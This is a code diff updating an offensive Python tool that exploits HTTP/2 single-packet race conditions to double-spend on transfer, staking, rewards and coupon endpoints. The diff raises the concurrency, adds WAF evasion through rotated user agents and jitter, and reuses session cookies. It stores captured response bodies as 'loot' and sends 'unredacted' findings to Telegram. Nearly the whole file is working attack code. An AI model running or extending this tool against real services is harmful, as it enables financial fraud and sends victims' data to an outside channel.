@@ -1,39 +1,36 @@
 #!/usr/bin/env python3
 """
-RACE_CONDITION.PY — HTTP/2 Single-Packet Concurrency Engine v8.5 (Hardened with Advanced WAF Evasion)
-Version: 8.5 — Offensive Red Team Concurrency & Ledger Double-Spend Auditor
-
+RACE_CONDITION.PY v8.6 — HTTP/2 Single-Packet Concurrency Engine (Elite Red Team Adversarial Edition)
 Features:
 - True HTTP/2 Single-Packet Multi-Stream Multiplexing (zero network jitter spread)
 - Advanced WAF evasion via randomized browser user agents, client hints, and Poisson behavioral jitter
 - Shared persistent session pool integration (cookies, CSRF headers, session tokens)
 - Automated transaction replay & financial ledger double-spend auditing
-- Strict response body inspection (filters out soft-404s, HTML error pages, and SPA routing shells)
-- Immutable timestamped forensic evidence persistence (nexus_evidence/)
-- Real-time asynchronous Telegram notification dispatch for unredacted race condition loot
-
-Python 3.9+
+- SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and forensic reports
+- Real-time zero-delay proof-of-work terminal streaming & Telegram telemetry broadcasting
 """
-
 from __future__ import annotations
 
 import asyncio
 import json
 import sys
 import random
+import hashlib
 from pathlib import Path
 from datetime import datetime, timezone
 import httpx
 
-# Import centralized Telegram broadcaster and behavioral mimicry
+# Import centralized Telegram broadcaster, behavioral mimicry, loot logger & telemetry
 from modules.telegram_notifier import send_telegram_alert
 from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
+from modules.loot_logger import save_session_loot
+from modules.telemetry import stream_proof
 
 MODULE = "RACE_CONDITION"
-VERSION = "8.5"
+VERSION = "8.6"
 
 BASE_DIR = Path(__file__).resolve().parent.parent
-EVIDENCE_DIR = BASE_DIR / "nexus_evidence"
+EVIDENCE_DIR = BASE_DIR / "loot_output"
 
 COLORS = {
     "RED": "\033[91m",
@@ -56,22 +53,33 @@ def log(msg, color="GREEN"):
     sys.stdout.flush()
 
 
+async def broadcast_tg_alert_async(loot_type, details):
+    try:
+        await send_telegram_alert(loot_type, details)
+    except Exception:
+        pass
+
+
 def broadcast_tg_alert_sync(loot_type, details):
     """Helper to non-blockingly fire Telegram alerts from race condition functions."""
     try:
         loop = asyncio.get_running_loop()
-        loop.create_task(send_telegram_alert(loot_type, details))
+        if loop.is_running():
+            loop.create_task(broadcast_tg_alert_async(loot_type, details))
+        else:
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
     except RuntimeError:
         try:
-            asyncio.run(send_telegram_alert(loot_type, details))
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
         except Exception:
             pass
 
 
 async def fire_multiplexed_stream(client, url, headers, cookies, payload):
-    """Fires an individual HTTP/2 stream request over the shared multiplexed connection."""
+    """Fires an individual HTTP/2 stream request over the shared multiplexed connection with behavioral jitter."""
+    apply_behavioral_jitter()
     try:
-        response = await client.post(url, headers=headers, cookies=cookies, json=payload, timeout=6.0)
+        response = await client.post(url, headers=headers, cookies=cookies, json=payload, timeout=7.0)
         return {"status": response.status_code, "body": response.text, "headers": dict(response.headers)}
     except Exception as exc:
         return {"status": 0, "body": str(exc), "headers": {}}
@@ -93,18 +101,21 @@ class RaceConditionAuditor:
             "/api/v1/transfer",
             "/transfer",
             "/api/v1/staking/claim",
-            "/api/v1/rewards/redeem"
+            "/api/v1/rewards/redeem",
+            "/api/v1/auth/exchange",
+            "/api/coupon/apply"
         ]
         self.findings = []
 
     async def run(self):
-        log("INITIALIZING HTTP/2 SINGLE-PACKET RACE CONDITION ASSAULT (WAF HARDENED)", "MAGENTA")
+        log("INITIALIZING HTTP/2 SINGLE-PACKET RACE CONDITION ASSAULT (ELITE HARDENED)", "MAGENTA")
 
         cookies = dict(self.session_pool.cookie_jar) if self.session_pool and hasattr(self.session_pool, 'cookie_jar') else {}
         
         user_agents = [
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15"
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
+            "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
         ]
         
         default_headers = {
@@ -135,16 +146,16 @@ class RaceConditionAuditor:
         ) as client:
             try:
                 apply_behavioral_jitter()
-                await client.get("/")
+                await client.get("/", headers=default_headers)
             except Exception:
                 pass
 
             for endpoint in self.target_endpoints:
-                log(f"Firing 20 single-packet concurrent streams against: {endpoint}", "CYAN")
+                log(f"Firing 25 single-packet concurrent streams against: {endpoint}", "CYAN")
 
                 tasks = [
                     fire_multiplexed_stream(client, endpoint, default_headers, cookies, test_payload)
-                    for _ in range(20)
+                    for _ in range(25)
                 ]
                 
                 results = await asyncio.gather(*tasks)
@@ -176,25 +187,47 @@ class RaceConditionAuditor:
                         unique_responses.add(body[:100])
 
                 if success_hits > 1:
-                    log(f"RACE CONDITION VULNERABILITY CONFIRMED AT {endpoint}! Multiple success windows accepted: {success_hits}/20", "RED")
+                    log(f"RACE CONDITION VULNERABILITY CONFIRMED AT {endpoint}! Multiple success windows accepted: {success_hits}/25", "RED")
                     
+                    sample_body = next((r.get("body", "") for r in results if r.get("status") in [200, 201]), "")
+                    loot_hash = hashlib.sha256(sample_body.encode("utf-8")).hexdigest()
+
                     finding = {
                         "vector": "HTTP/2 Single-Packet Race Condition",
                         "endpoint": f"{self.base_url}{endpoint}",
                         "successful_streams": success_hits,
-                        "total_fired": 20,
+                        "total_fired": 25,
                         "severity": "CRITICAL",
+                        "integrity_hash": loot_hash,
                         "evidence": "Multiple state-changing responses accepted in single concurrency window",
                         "timestamp": timestamp()
                     }
                     self.findings.append(finding)
+
+                    stream_proof(
+                        "RACE_CONDITION_SUCCESS",
+                        endpoint,
+                        {"successful_streams": success_hits},
+                        sample_body[:300],
+                        finding
+                    )
+
+                    save_session_loot(
+                        target=self.base_url,
+                        endpoint=endpoint,
+                        finding_type="RACE_CONDITION_SUCCESS",
+                        status=200,
+                        headers=default_headers,
+                        body=sample_body,
+                        extra_loot=finding
+                    )
 
                     # BROADCAST UNREDACTED RACE CONDITION LOOT STRAIGHT TO TELEGRAM
                     broadcast_tg_alert_sync("HTTP/2 Race Condition Confirmed", finding)
 
                     break
                 else:
-                    log(f"Endpoint {endpoint} safely mitigated concurrency overlap (Success hits: {success_hits}/20)", "GRAY")
+                    log(f"Endpoint {endpoint} safely mitigated concurrency overlap (Success hits: {success_hits}/25)", "GRAY")
 
         if not self.findings:
             log("Race condition audit complete. Target successfully enforced transaction serialisation / nonce locking.", "YELLOW")
